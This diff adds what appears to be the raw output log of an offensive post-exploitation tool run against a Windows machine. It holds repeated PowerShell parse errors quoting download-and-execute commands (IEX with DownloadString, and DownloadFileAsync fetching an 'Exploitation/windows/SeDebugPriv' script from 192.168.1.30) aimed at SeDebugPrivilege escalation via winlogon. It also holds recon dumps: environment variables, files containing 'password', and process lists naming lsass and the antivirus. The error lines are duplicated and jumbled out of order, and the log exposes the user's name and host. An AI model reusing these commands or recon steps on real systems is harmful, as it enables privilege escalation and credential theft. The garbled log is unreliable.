@@ -1,0 +1,853 @@
+ At line:1 char:64
++                                                                  ~
++ ... oami /priv > $env:USERPROFILE/privs;$file = $env:USERPROFILE+\privs;$ ...
+You must provide a value expression following the '+' operator.
+At line:1 char:64
++                                                            ~~~~~~
++ ... priv > $env:USERPROFILE/privs;$file = $env:USERPROFILE+\privs;$h= Get ...
+Unexpected token '\privs' in expression or statement.
++ ... ile | select-string ^SeDebugPrivilege; $enabletest= $h -split \s+;if( ...
+At line:1 char:150
++                                                                  ~
+You must provide a value expression following the '-split' operator.
+At line:1 char:151
++ ... | select-string ^SeDebugPrivilege; $enabletest= $h -split \s+;if($ena ...
++                                                               ~~~
+Unexpected token '\s+' in expression or statement.
+At line:1 char:176
++ ... ugPrivilege; $enabletest= $h -split \s+;if($enabletest[3] -eq Enabled ...
++                                                                  ~
+You must provide a value expression following the '-eq' operator.
+At line:1 char:177
++ ... ege; $enabletest= $h -split \s+;if($enabletest[3] -eq Enabled) {taskl ...
++                                                           ~~~~~~~
+Unexpected token 'Enabled' in expression or statement.
+At line:1 char:177
++ ... ege; $enabletest= $h -split \s+;if($enabletest[3] -eq Enabled) {taskl ...
++                                                           ~~~~~~~
+Missing closing ')' after expression in 'if' statement.
++ ... ge; $enabletest= $h -split \s+;if($enabletest[3] -eq Enabled) {taskli ...
+At line:1 char:184
++                                                                 ~
+Unexpected token ')' in expression or statement.
+At line:1 char:246
++ ...  {tasklist > $env:USERPROFILE/tasks;$file = $env:USERPROFILE+/tasks;$ ...
++                                                                  ~
+You must provide a value expression following the '+' operator.
+At line:1 char:247
++ ... {tasklist > $env:USERPROFILE/tasks;$file = $env:USERPROFILE+/tasks;$h ...
++                                                                  ~
+You must provide a value expression following the '/' operator.
+Not all parse errors were reported.  Correct the reported errors and try again.
+    + CategoryInfo          : ParserError: (:) [], ParentContainsErrorRecordException
+    + FullyQualifiedErrorId : ExpectedValueExpression At line:1 char:64
++ ... oami /priv > $env:USERPROFILE/privs;$file = $env:USERPROFILE+\privs;$ ...
++                                                                  ~
+At line:1 char:64
++ ... priv > $env:USERPROFILE/privs;$file = $env:USERPROFILE+\privs;$h= Get ...
+You must provide a value expression following the '+' operator.
++                                                            ~~~~~~
+Unexpected token '\privs' in expression or statement.
++ ... file | select-string ^SeDebugPrivilege;$enabletest= $h -split \s+;if( ...
+At line:1 char:149
++                                                                  ~
+You must provide a value expression following the '-split' operator.
+At line:1 char:150
++ ...  | select-string ^SeDebugPrivilege;$enabletest= $h -split \s+;if($ena ...
++                                                               ~~~
+Unexpected token '\s+' in expression or statement.
+At line:1 char:247
++ ...  {tasklist > $env:USERPROFILE/tasks;$file = $env:USERPROFILE+\tasks;$ ...
++                                                                  ~
+You must provide a value expression following the '+' operator.
+At line:1 char:247
++ ... list > $env:USERPROFILE/tasks;$file = $env:USERPROFILE+\tasks;$h= Get ...
++                                                            ~~~~~~
+Unexpected token '\tasks' in expression or statement.
+At line:1 char:327
++ ... ent $file | select-string ^winlogon.exe;$processid= $h -split \s+;IEX ...
++                                                                  ~
+You must provide a value expression following the '-split' operator.
+At line:1 char:328
++ ... $file | select-string ^winlogon.exe;$processid= $h -split \s+;IEX(New ...
++                                                               ~~~
+Unexpected token '\s+' in expression or statement.
+    + CategoryInfo          : ParserError: (:) [], ParentContainsErrorRecordException
+    + FullyQualifiedErrorId : ExpectedValueExpression At line:1 char:64
++ ... oami /priv > $env:USERPROFILE/privs;$file = $env:USERPROFILE+\privs;$ ...
++                                                                  ~
+At line:1 char:64
++ ... priv > $env:USERPROFILE/privs;$file = $env:USERPROFILE+\privs;$h= Get ...
++                                                            ~~~~~~
+Unexpected token '\privs' in expression or statement.
+At line:1 char:150
++ ... ile | select-string ^SeDebugPrivilege; $enabletest= $h -split \s+;if( ...
++                                                                  ~
+You must provide a value expression following the '-split' operator.
+At line:1 char:151
++ ... | select-string ^SeDebugPrivilege; $enabletest= $h -split \s+;if($ena ...
++                                                               ~~~
+Unexpected token '\s+' in expression or statement.
+You must provide a value expression following the '+' operator.
+At line:1 char:176
++ ... ugPrivilege; $enabletest= $h -split \s+;if($enabletest[3] -eq Enabled ...
++                                                                  ~
+You must provide a value expression following the '-eq' operator.
+At line:1 char:177
++ ... ege; $enabletest= $h -split \s+;if($enabletest[3] -eq Enabled) {taskl ...
++                                                           ~~~~~~~
+Unexpected token 'Enabled' in expression or statement.
+At line:1 char:177
++ ... ege; $enabletest= $h -split \s+;if($enabletest[3] -eq Enabled) {taskl ...
++                                                           ~~~~~~~
+Missing closing ')' after expression in 'if' statement.
+At line:1 char:184
++ ... ge; $enabletest= $h -split \s+;if($enabletest[3] -eq Enabled) {taskli ...
++                                                                 ~
+Unexpected token ')' in expression or statement.
++ ...  {tasklist > $env:USERPROFILE/tasks;$file = $env:USERPROFILE+/tasks;$ ...
+At line:1 char:246
++                                                                  ~
+You must provide a value expression following the '+' operator.
+At line:1 char:247
++ ... {tasklist > $env:USERPROFILE/tasks;$file = $env:USERPROFILE+/tasks;$h ...
++                                                                  ~
+You must provide a value expression following the '/' operator.
+Not all parse errors were reported.  Correct the reported errors and try again.
+    + CategoryInfo          : ParserError: (:) [], ParentContainsErrorRecordException
+    + FullyQualifiedErrorId : ExpectedValueExpression At line:1 char:64
++ ... oami /priv > $env:USERPROFILE/privs;$file = $env:USERPROFILE+\privs;$ ...
++                                                                  ~
+You must provide a value expression following the '+' operator.
++ ... priv > $env:USERPROFILE/privs;$file = $env:USERPROFILE+\privs;$h= Get ...
++                                                            ~~~~~~
+Unexpected token '\privs' in expression or statement.
+At line:1 char:177
++ ... gPrivilege; $enabletest= $h -split(\s+);if($enabletest[3] -eq Enabled ...
+At line:1 char:64
++                                                                  ~
+You must provide a value expression following the '-eq' operator.
+At line:1 char:178
++ ... ge; $enabletest= $h -split(\s+);if($enabletest[3] -eq Enabled) {taskl ...
++                                                           ~~~~~~~
+Unexpected token 'Enabled' in expression or statement.
+At line:1 char:178
++ ... ge; $enabletest= $h -split(\s+);if($enabletest[3] -eq Enabled) {taskl ...
++                                                           ~~~~~~~
+Missing closing ')' after expression in 'if' statement.
+At line:1 char:185
++ ... e; $enabletest= $h -split(\s+);if($enabletest[3] -eq Enabled) {taskli ...
++                                                                 ~
+Unexpected token ')' in expression or statement.
+At line:1 char:247
++ ...  {tasklist > $env:USERPROFILE/tasks;$file = $env:USERPROFILE+/tasks;$ ...
++                                                                  ~
+You must provide a value expression following the '+' operator.
+At line:1 char:248
++ ... {tasklist > $env:USERPROFILE/tasks;$file = $env:USERPROFILE+/tasks;$h ...
++                                                                  ~
+You must provide a value expression following the '/' operator.
+At line:1 char:248
++                                                             ~~~~~
++ ... list > $env:USERPROFILE/tasks;$file = $env:USERPROFILE+/tasks;$h= Get ...
+Unexpected token 'tasks' in expression or statement.
+At line:1 char:379
++ ...  $h -split(\s+);IEX(New-Object Net.WebClient).DownloadString(http://1 ...
++                                                                  ~
+Missing ')' in method call.
+Not all parse errors were reported.  Correct the reported errors and try again.
+    + CategoryInfo          : ParserError: (:) [], ParentContainsErrorRecordException
+    + FullyQualifiedErrorId : ExpectedValueExpression At line:1 char:64
++                                                                  ~
++ ... oami /priv > $env:USERPROFILE/privs;$file = $env:USERPROFILE+\privs;$ ...
+At line:1 char:64
+You must provide a value expression following the '+' operator.
++ ... priv > $env:USERPROFILE/privs;$file = $env:USERPROFILE+\privs;$h= Get ...
++                                                            ~~~~~~
+Unexpected token '\privs' in expression or statement.
+At line:1 char:177
++ ... gPrivilege; $enabletest= $h -split(\s+);if($enabletest[3] -eq Enabled ...
++                                                                  ~
+You must provide a value expression following the '-eq' operator.
+At line:1 char:178
++ ... ge; $enabletest= $h -split(\s+);if($enabletest[3] -eq Enabled) {taskl ...
++                                                           ~~~~~~~
+Unexpected token 'Enabled' in expression or statement.
+At line:1 char:178
++ ... ge; $enabletest= $h -split(\s+);if($enabletest[3] -eq Enabled) {taskl ...
++                                                           ~~~~~~~
+Missing closing ')' after expression in 'if' statement.
+At line:1 char:185
++ ... e; $enabletest= $h -split(\s+);if($enabletest[3] -eq Enabled) {taskli ...
++                                                                 ~
+Unexpected token ')' in expression or statement.
+At line:1 char:247
++ ...  {tasklist > $env:USERPROFILE/tasks;$file = $env:USERPROFILE+/tasks;$ ...
++                                                                  ~
+You must provide a value expression following the '+' operator.
+At line:1 char:248
++ ... {tasklist > $env:USERPROFILE/tasks;$file = $env:USERPROFILE+/tasks;$h ...
++                                                                  ~
+You must provide a value expression following the '/' operator.
+At line:1 char:248
++ ... list > $env:USERPROFILE/tasks;$file = $env:USERPROFILE+/tasks;$h= Get ...
++                                                             ~~~~~
+Unexpected token 'tasks' in expression or statement.
+At line:1 char:379
++ ...  $h -split(\s+);IEX(New-Object Net.WebClient).DownloadString(http://1 ...
++                                                                  ~
+Missing ')' in method call.
+Not all parse errors were reported.  Correct the reported errors and try again.
+    + CategoryInfo          : ParserError: (:) [], ParentContainsErrorRecordException
+    + FullyQualifiedErrorId : ExpectedValueExpression At line:1 char:46
++                                              ~
++ (New-Object Net.WebClient).DownloadFileAsync(http://192.168.1.30:8888 ...
+At line:1 char:46
+Missing ')' in method call.
++ ... adFileAsync(http://192.168.1.30:8888/Exploitation/windows/SeDebugPriv ...
++                 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+Unexpected token 'http://192.168.1.30:8888/Exploitation/windows/SeDebugPriv' in expression or statement.
+At line:1 char:103
++ ... nc(http://192.168.1.30:8888/Exploitation/windows/SeDebugPriv, $env:us ...
++                                                                 ~
+Missing argument in parameter list.
+At line:1 char:133
++ ... ploitation/windows/SeDebugPriv, $env:userprofile\sedebug.ps1);.\$env: ...
++                                                                 ~
+Unexpected token ')' in expression or statement.
+    + CategoryInfo          : ParserError: (:) [], ParentContainsErrorRecordException
+    + FullyQualifiedErrorId : MissingEndParenthesisInMethodCall++++++++++++++++++
+===============All_environment_variables===============
+Name                           Value                                                                                   
+----                           -----                                                                                   
+ALLUSERSPROFILE                C:\ProgramData                                                                          
+APPDATA                        C:\Users\Alsadeq\AppData\Roaming                                                        
+CARBON_MEM_DISABLE             1                                                                                       
+CommonProgramFiles             C:\Program Files\Common Files                                                           
+CommonProgramFiles(x86)        C:\Program Files (x86)\Common Files                                                     
+CommonProgramW6432             C:\Program Files\Common Files                                                           
+COMPUTERNAME                   DESKTOP-L2CC34A                                                                         
+ComSpec                        C:\Windows\system32\cmd.exe                                                             
+DriverData                     C:\Windows\System32\Drivers\DriverData                                                  
+HOMEDRIVE                      C:                                                                                      
+HOMEPATH                       \Users\Alsadeq                                                                          
+LOCALAPPDATA                   C:\Users\Alsadeq\AppData\Local                                                          
+LOGONSERVER                    \\DESKTOP-L2CC34A                                                                       
+NUMBER_OF_PROCESSORS           12                                                                                      
+OneDrive                       C:\Users\Alsadeq\OneDrive                                                               
+OS                             Windows_NT                                                                              
+Path                           C:\Program Files (x86)\VMware\VMware Player\bin\;C:\Windows\system32;C:\Windows;C:\Wi...
+PATHEXT                        .COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC;.CPL                              
+PROCESSOR_ARCHITECTURE         AMD64                                                                                   
+PROCESSOR_IDENTIFIER           Intel64 Family 6 Model 158 Stepping 10, GenuineIntel                                    
+PROCESSOR_LEVEL                6                                                                                       
+PROCESSOR_REVISION             9e0a                                                                                    
+ProgramData                    C:\ProgramData                                                                          
+ProgramFiles                   C:\Program Files                                                                        
+ProgramFiles(x86)              C:\Program Files (x86)                                                                  
+ProgramW6432                   C:\Program Files                                                                        
+PROMPT                         $P$G                                                                                    
+PSExecutionPolicyPreference    Bypass                                                                                  
+PSModulePath                   C:\Users\Alsadeq\Documents\WindowsPowerShell\Modules;C:\Program Files\WindowsPowerShe...
+PT7HOME                        D:\Cisco Packet Tracer 7.0                                                              
+PUBLIC                         C:\Users\Public                                                                         
+SystemDrive                    C:                                                                                      
+SystemRoot                     C:\Windows                                                                              
+TEMP                           C:\Users\Alsadeq\AppData\Local\Temp                                                     
+TMP                            C:\Users\Alsadeq\AppData\Local\Temp                                                     
+USERDOMAIN                     DESKTOP-L2CC34A                                                                         
+USERDOMAIN_ROAMINGPROFILE      DESKTOP-L2CC34A                                                                         
+USERNAME                       Alsadeq                                                                                 
+USERPROFILE                    C:\Users\Alsadeq                                                                        
+windir                         C:\Windows                                                                              
+++++++++++++++++++ ++++++++++++++++++
+	
+===============All_files_contain_password===============
+DDFs\NGCProDDF_v1.2_final.xml
+DriverStore\FileRepository\prnms009.inf_amd64_a7412a554c9bc1fd\MPDW-PDC.xml
+DriverStore\FileRepository\prnms009.inf_amd64_a7412a554c9bc1fd\MPDW_devmode_map.xml
+DriverStore\FileRepository\prnms012.inf_amd64_707d3849370b9d23\Amd64\MSIPP.xml
+icsxml\pppcfg.xml
+NarratorControlTemplates.xml
+spool\tools\Microsoft Print To PDF\MPDW-PDC.xml
+spool\tools\Microsoft Print To PDF\MPDW_devmode_map.xml
+spool\V4Dirs\F977B54B-E048-479D-B1B8-71551AB69D7A\pdc.xml
+icsxml\ipcfg.xml
+	
+++++++++++++++++++  At line:1 char:46
++ (New-Object Net.WebClient).DownloadFileAsync(http://192.168.1.30:8888 ...
++                                              ~
+Missing ')' in method call.
+At line:1 char:46
++ ... adFileAsync(http://192.168.1.30:8888/Exploitation/windows/SeDebugPriv ...
++                 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+Unexpected token 'http://192.168.1.30:8888/Exploitation/windows/SeDebugPriv' in expression or statement.
+At line:1 char:103
++ ... nc(http://192.168.1.30:8888/Exploitation/windows/SeDebugPriv, $env:us ...
++                                                                 ~
+Missing argument in parameter list.
+At line:1 char:133
++ ... ploitation/windows/SeDebugPriv, $env:userprofile\sedebug.ps1);.\$env: ...
++                                                                 ~
+Unexpected token ')' in expression or statement.
+    + CategoryInfo          : ParserError: (:) [], ParentContainsErrorRecordException
+    + FullyQualifiedErrorId : MissingEndParenthesisInMethodCall At line:1 char:46
++ (New-Object Net.WebClient).DownloadFileAsync(http://192.168.1.30:8888 ...
++                                              ~
+At line:1 char:46
++ ... adFileAsync(http://192.168.1.30:8888/Exploitation/windows/SeDebugPriv ...
++                 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+Unexpected token 'http://192.168.1.30:8888/Exploitation/windows/SeDebugPriv' in expression or statement.
+At line:1 char:103
++ ... nc(http://192.168.1.30:8888/Exploitation/windows/SeDebugPriv, $env:us ...
++                                                                 ~
+Missing argument in parameter list.
+Missing ')' in method call.
+At line:1 char:133
++ ... ploitation/windows/SeDebugPriv, $env:userprofile\sedebug.ps1);.\$env: ...
++                                                                 ~
+Unexpected token ')' in expression or statement.
+    + CategoryInfo          : ParserError: (:) [], ParentContainsErrorRecordException
+    + FullyQualifiedErrorId : MissingEndParenthesisInMethodCall++++++++++++++++++
+===============Task_List===============
+Image Name                     PID Session Name        Session#    Mem Usage
+========================= ======== ================ =========== ============
+System Idle Process              0 Services                   0          8 K
+System                           4 Services                   0        152 K
+Registry                       148 Services                   0     45,640 K
+smss.exe                       544 Services                   0      1,152 K
+csrss.exe                      888 Services                   0      5,804 K
+wininit.exe                    996 Services                   0      6,228 K
+csrss.exe                     1004 Console                    1      6,472 K
+services.exe                   720 Services                   0      9,760 K
+winlogon.exe                  1028 Console                    1     14,304 K
+lsass.exe                     1072 Services                   0     26,380 K
+svchost.exe                   1180 Services                   0     33,912 K
+fontdrvhost.exe               1216 Services                   0      2,572 K
+fontdrvhost.exe               1224 Console                    1      6,820 K
+WUDFHost.exe                  1348 Services                   0     14,872 K
+svchost.exe                   1356 Services                   0     16,444 K
+svchost.exe                   1432 Services                   0     10,564 K
+dwm.exe                       1496 Console                    1     74,752 K
+svchost.exe                   1672 Services                   0     11,084 K
+svchost.exe                   1700 Services                   0      5,656 K
+svchost.exe                   1708 Services                   0      4,792 K
+svchost.exe                   1844 Services                   0     13,440 K
+svchost.exe                   1852 Services                   0     11,628 K
+svchost.exe                   1860 Services                   0     10,284 K
+svchost.exe                   1868 Services                   0     15,904 K
+IntelCpHDCPSvc.exe            1996 Services                   0      6,692 K
+svchost.exe                   2004 Services                   0      7,912 K
+svchost.exe                   2012 Services                   0     11,044 K
+svchost.exe                    988 Services                   0      5,916 K
+svchost.exe                   1556 Services                   0     16,040 K
+svchost.exe                   2188 Services                   0     10,700 K
+svchost.exe                   2252 Services                   0      6,608 K
+IntelCpHeciSvc.exe            2356 Services                   0      6,680 K
+svchost.exe                   2392 Services                   0     10,272 K
+helperservice.exe             2436 Services                   0      1,472 K
+svchost.exe                   2520 Services                   0      7,860 K
+svchost.exe                   2572 Services                   0      7,020 K
+NVDisplay.Container.exe       2664 Services                   0     17,620 K
+svchost.exe                   2792 Services                   0     13,264 K
+svchost.exe                   2828 Services                   0      7,956 K
+svchost.exe                   2904 Services                   0      5,456 K
+svchost.exe                   2912 Services                   0     13,860 K
+svchost.exe                   2920 Services                   0      7,348 K
+ETDService.exe                2928 Services                   0      5,960 K
+svchost.exe                   2992 Services                   0     15,732 K
+Memory Compression            2144 Services                   0    292,144 K
+svchost.exe                   2876 Services                   0      8,008 K
+svchost.exe                   3080 Services                   0     10,684 K
+svchost.exe                   3124 Services                   0      7,748 K
+igfxCUIService.exe            3148 Services                   0      8,644 K
+svchost.exe                   3272 Services                   0      7,308 K
+svchost.exe                   3284 Services                   0      7,348 K
+svchost.exe                   3292 Services                   0      8,356 K
+svchost.exe                   3416 Services                   0      7,588 K
+svchost.exe                   3564 Services                   0      8,884 K
+NVDisplay.Container.exe       3720 Console                    1     41,652 K
+svchost.exe                   3752 Services                   0     12,696 K
+ETDCtrlHelper.exe             3832 Console                    1      8,724 K
+ETDCtrl.exe                   3840 Console                    1     21,536 K
+svchost.exe                   3920 Services                   0      6,404 K
+svchost.exe                   3928 Services                   0     10,048 K
+svchost.exe                   3980 Services                   0     21,464 K
+conhost.exe                   4036 Services                   0      1,012 K
+svchost.exe                   3604 Services                   0     18,564 K
+svchost.exe                   4132 Services                   0     11,912 K
+svchost.exe                   4140 Services                   0     20,256 K
+svchost.exe                   4196 Services                   0     10,728 K
+spoolsv.exe                   4296 Services                   0     12,292 K
+svchost.exe                   4512 Services                   0     25,788 K
+svchost.exe                   4524 Services                   0     13,612 K
+svchost.exe                   4532 Services                   0      7,704 K
+svchost.exe                   4540 Services                   0     36,124 K
+DAX3API.exe                   4580 Services                   0     10,668 K
+FMService64.exe               4592 Services                   0      6,948 K
+avp.exe                       4604 Services                   0    194,980 K
+OneApp.IGCC.WinService.ex     4616 Services                   0     28,968 K
+JetBrains.Etw.Collector.H     4632 Services                   0      4,200 K
+svchost.exe                   4648 Services                   0      5,200 K
+vmware-authd.exe              4656 Services                   0     10,636 K
+RtkAudUService64.exe          4664 Services                   0      9,084 K
+svchost.exe                   4672 Services                   0      5,964 K
+RstMwService.exe              4680 Services                   0      6,360 K
+sqlwriter.exe                 4688 Services                   0      7,588 K
+svchost.exe                   4708 Services                   0      7,912 K
+jhi_service.exe               4732 Services                   0      4,784 K
+OfficeClickToRun.exe          4752 Services                   0     40,260 K
+vmnetdhcp.exe                 4744 Services                   0      5,092 K
+vmware-usbarbitrator64.ex     4788 Services                   0     11,176 K
+LMS.exe                       4800 Services                   0      8,856 K
+vmnat.exe                     4816 Services                   0      6,860 K
+wlanext.exe                   4832 Services                   0      5,492 K
+svchost.exe                   4904 Services                   0     22,080 K
+esif_uf.exe                   4968 Services                   0      5,724 K
+conhost.exe                   5052 Services                   0      4,708 K
+svchost.exe                   5088 Services                   0      8,828 K
+svchost.exe                   5156 Services                   0      6,688 K
+svchost.exe                   5356 Services                   0      5,000 K
+svchost.exe                   5592 Services                   0      5,616 K
+svchost.exe                   6028 Services                   0     12,992 K
+svchost.exe                   6928 Services                   0      5,288 K
+DAX3API.exe                   7132 Console                    1     10,220 K
+ETDTouch.exe                  6668 Console                    1      5,508 K
+sihost.exe                    6856 Console                    1     27,024 K
+svchost.exe                   7008 Console                    1     27,476 K
+igfxEM.exe                    7092 Console                    1     17,744 K
+svchost.exe                   7104 Console                    1     31,980 K
+svchost.exe                   7288 Services                   0     20,800 K
+taskhostw.exe                 7384 Console                    1     18,048 K
+explorer.exe                  7508 Console                    1    159,920 K
+svchost.exe                   7548 Services                   0      7,512 K
+ctfmon.exe                    7596 Console                    1     23,260 K
+svchost.exe                   7780 Services                   0     18,196 K
+svchost.exe                   7652 Services                   0      8,192 K
+svchost.exe                   8416 Console                    1     31,568 K
+svchost.exe                   8860 Services                   0     12,576 K
+StartMenuExperienceHost.e     7480 Console                    1     89,036 K
+SearchIndexer.exe             9368 Services                   0     47,536 K
+RuntimeBroker.exe             9464 Console                    1     22,280 K
+SearchApp.exe                 9916 Console                    1    111,204 K
+RuntimeBroker.exe             9648 Console                    1     41,448 K
+LockApp.exe                  11068 Console                    1     51,568 K
+svchost.exe                  11168 Services                   0     15,644 K
+RuntimeBroker.exe            11240 Console                    1     33,864 K
+svchost.exe                  10800 Services                   0     10,380 K
+taskhostw.exe                11480 Console                    1     15,880 K
+svchost.exe                  11632 Services                   0     11,304 K
+avpui.exe                    11892 Console                    1      8,476 K
+dllhost.exe                  12252 Services                   0     11,052 K
+RuntimeBroker.exe             3216 Console                    1     25,172 K
+TextInputHost.exe            12640 Console                    1     59,512 K
+WhatsApp.exe                 13124 Console                    1     32,572 K
+SecurityHealthSystray.exe    13208 Console                    1      9,328 K
+SecurityHealthService.exe    13256 Services                   0     15,956 K
+RtkAudUService64.exe         12448 Console                    1      9,888 K
+RuntimeBroker.exe            12444 Console                    1     24,756 K
+Greenshot.exe                 4932 Console                    1     41,316 K
+fdm.exe                      12900 Console                    1     70,024 K
+ONENOTEM.EXE                 12740 Console                    1      2,256 K
+vmplayer.exe                 13104 Console                    1     57,248 K
+svchost.exe                   8136 Services                   0      8,388 K
+vmware-unity-helper.exe       2036 Console                    1     19,272 K
+vmware-vmx.exe                2544 Console                    1  6,575,564 K
+dllhost.exe                   5752 Console                    1     12,548 K
+kpm_tray.exe                 13908 Console                    1      2,888 K
+SystemSettings.exe           13352 Console                    1      2,300 K
+ApplicationFrameHost.exe     12260 Console                    1     31,428 K
+svchost.exe                   9936 Services                   0     23,056 K
+UserOOBEBroker.exe           10496 Console                    1      9,560 K
+svchost.exe                   9700 Console                    1     20,756 K
+ksde.exe                     14004 Services                   0     20,788 K
+SgrmBroker.exe                 412 Services                   0      6,900 K
+svchost.exe                  12528 Services                   0     10,700 K
+ksdeui.exe                   13328 Console                    1      4,388 K
+svchost.exe                   3760 Services                   0      7,560 K
+CalculatorApp.exe             1340 Console                    1      1,564 K
+RuntimeBroker.exe             3500 Console                    1      6,736 K
+Wireshark.exe                14080 Console                    1    195,420 K
+cmd.exe                      14108 Console                    1      1,104 K
+conhost.exe                   7644 Console                    1      1,064 K
+LSB.exe                      11660 Console                    1      1,628 K
+SearchApp.exe                11268 Console                    1     89,444 K
+dumpcap.exe                  12080 Console                    1      8,828 K
+conhost.exe                  11960 Console                    1      7,408 K
+WmiPrvSE.exe                  3968 Services                   0      9,780 K
+svchost.exe                  10856 Services                   0      8,640 K
+Video.UI.exe                 11856 Console                    1      1,548 K
+RuntimeBroker.exe             9768 Console                    1      7,496 K
+svchost.exe                  12344 Services                   0     20,372 K
+Microsoft.Photos.exe         14124 Console                    1      2,664 K
+RuntimeBroker.exe             4888 Console                    1     30,748 K
+ShellExperienceHost.exe       2484 Console                    1     53,528 K
+RuntimeBroker.exe            12600 Console                    1     16,248 K
+Notion.exe                    3580 Console                    1     98,480 K
+Notion.exe                   11568 Console                    1     26,364 K
+Notion.exe                    8924 Console                    1    129,640 K
+Notion.exe                    9756 Console                    1     47,524 K
+Notion.exe                    8568 Console                    1     49,684 K
+Notion.exe                    8928 Console                    1    209,852 K
+Notion.exe                    1668 Console                    1     59,364 K
+Notion.exe                   12192 Console                    1     64,140 K
+explorer.exe                  4104 Console                    1     68,076 K
+notepad.exe                  14320 Console                    1     18,308 K
+svchost.exe                  13164 Services                   0      9,960 K
+svchost.exe                  14052 Services                   0      7,788 K
+smartscreen.exe               5188 Console                    1     24,152 K
+audiodg.exe                  13488 Services                   0     17,884 K
+cmd.exe                       1984 Console                    1      4,624 K
+conhost.exe                   5480 Console                    1     20,064 K
+powershell.exe                5868 Console                    1     81,496 K
+powershell.exe               11228 Console                    1     58,996 K
+conhost.exe                    260 Console                    1      7,904 K
+tasklist.exe                  4920 Console                    1      9,296 K
+WmiPrvSE.exe                  7708 Services                   0      9,608 K
+	
+++++++++++++++++++  At line:1 char:46
++ (New-Object Net.WebClient).DownloadFileAsync(http://192.168.1.30:8888 ...
++                                              ~
+Missing ')' in method call.
+At line:1 char:46
++                 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
++ ... adFileAsync(http://192.168.1.30:8888/Exploitation/windows/SeDebugPriv ...
+Unexpected token 'http://192.168.1.30:8888/Exploitation/windows/SeDebugPriv' in expression or statement.
+At line:1 char:103
++ ... nc(http://192.168.1.30:8888/Exploitation/windows/SeDebugPriv, $env:us ...
++                                                                 ~
+Missing argument in parameter list.
+At line:1 char:133
++ ... ploitation/windows/SeDebugPriv, $env:userprofile\sedebug.ps1);.\$env: ...
++                                                                 ~
+Unexpected token ')' in expression or statement.
+    + CategoryInfo          : ParserError: (:) [], ParentContainsErrorRecordException
+    + FullyQualifiedErrorId : MissingEndParenthesisInMethodCall At line:1 char:46
++ (New-Object Net.WebClient).DownloadFileAsync(http://192.168.1.30:4444 ...
++                                              ~
+At line:1 char:46
++                              ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
++ ... lient).DownloadFileAsync(http://192.168.1.30:4444/sedebug.ps1, $env:u ...
+Unexpected token 'http://192.168.1.30:4444/sedebug.ps1' in expression or statement.
+At line:1 char:82
++ ... ient).DownloadFileAsync(http://192.168.1.30:4444/sedebug.ps1, $env:us ...
++                                                                 ~
+Missing argument in parameter list.
+At line:1 char:112
++ ... /192.168.1.30:4444/sedebug.ps1, $env:userprofile\sedebug.ps1);.\$env: ...
++                                                                 ~
+Unexpected token ')' in expression or statement.
+    + CategoryInfo          : ParserError: (:) [], ParentContainsErrorRecordException
+    + FullyQualifiedErrorId : MissingEndParenthesisInMethodCall
+ 
+Missing ')' in method call. At line:1 char:46
++ (New-Object Net.WebClient).DownloadFileAsync(http://192.168.1.30:4444 ...
++                                              ~
+Missing ')' in method call.
+At line:1 char:46
++ ... lient).DownloadFileAsync(http://192.168.1.30:4444/sedebug.ps1, $env:u ...
++                              ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+Unexpected token 'http://192.168.1.30:4444/sedebug.ps1' in expression or statement.
+At line:1 char:82
++ ... ient).DownloadFileAsync(http://192.168.1.30:4444/sedebug.ps1, $env:us ...
++                                                                 ~
+Missing argument in parameter list.
+At line:1 char:112
++ ... /192.168.1.30:4444/sedebug.ps1, $env:userprofile\sedebug.ps1);powersh ...
++                                                                 ~
+Unexpected token ')' in expression or statement.
+    + CategoryInfo          : ParserError: (:) [], ParentContainsErrorRecordException
+    + FullyQualifiedErrorId : MissingEndParenthesisInMethodCall At line:1 char:46
++                                              ~
++ (New-Object Net.WebClient).DownloadFileAsync(http://192.168.1.30:4444 ...
+Missing ')' in method call.
++ ... lient).DownloadFileAsync(http://192.168.1.30:4444/sedebug.ps1, $env:u ...
++                              ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+Unexpected token 'http://192.168.1.30:4444/sedebug.ps1' in expression or statement.
+At line:1 char:82
++ ... ient).DownloadFileAsync(http://192.168.1.30:4444/sedebug.ps1, $env:us ...
++                                                                 ~
+Missing argument in parameter list.
+At line:1 char:112
++ ... /192.168.1.30:4444/sedebug.ps1, $env:userprofile\sedebug.ps1);powersh ...
++                                                                 ~
+Unexpected token ')' in expression or statement.
+    + CategoryInfo          : ParserError: (:) [], ParentContainsErrorRecordException
+    + FullyQualifiedErrorId : MissingEndParenthesisInMethodCall
+ 
+At line:1 char:46++++++++++++++++++
+===============Task_List===============
+Image Name                     PID Session Name        Session#    Mem Usage
+========================= ======== ================ =========== ============
+System Idle Process              0 Services                   0          8 K
+System                           4 Services                   0        152 K
+Registry                       148 Services                   0     38,652 K
+smss.exe                       544 Services                   0      1,152 K
+csrss.exe                      888 Services                   0      5,808 K
+wininit.exe                    996 Services                   0      6,228 K
+csrss.exe                     1004 Console                    1      6,472 K
+services.exe                   720 Services                   0      9,796 K
+winlogon.exe                  1028 Console                    1     14,328 K
+lsass.exe                     1072 Services                   0     26,608 K
+svchost.exe                   1180 Services                   0     34,104 K
+fontdrvhost.exe               1216 Services                   0      2,572 K
+fontdrvhost.exe               1224 Console                    1      6,820 K
+WUDFHost.exe                  1348 Services                   0     14,868 K
+svchost.exe                   1356 Services                   0     16,696 K
+svchost.exe                   1432 Services                   0     10,464 K
+dwm.exe                       1496 Console                    1     74,176 K
+svchost.exe                   1672 Services                   0     11,112 K
+svchost.exe                   1700 Services                   0      5,672 K
+svchost.exe                   1708 Services                   0      4,792 K
+svchost.exe                   1844 Services                   0     13,484 K
+svchost.exe                   1852 Services                   0     11,692 K
+svchost.exe                   1860 Services                   0     10,284 K
+svchost.exe                   1868 Services                   0     15,880 K
+IntelCpHDCPSvc.exe            1996 Services                   0      6,692 K
+svchost.exe                   2004 Services                   0      7,912 K
+svchost.exe                   2012 Services                   0     10,952 K
+svchost.exe                    988 Services                   0      5,916 K
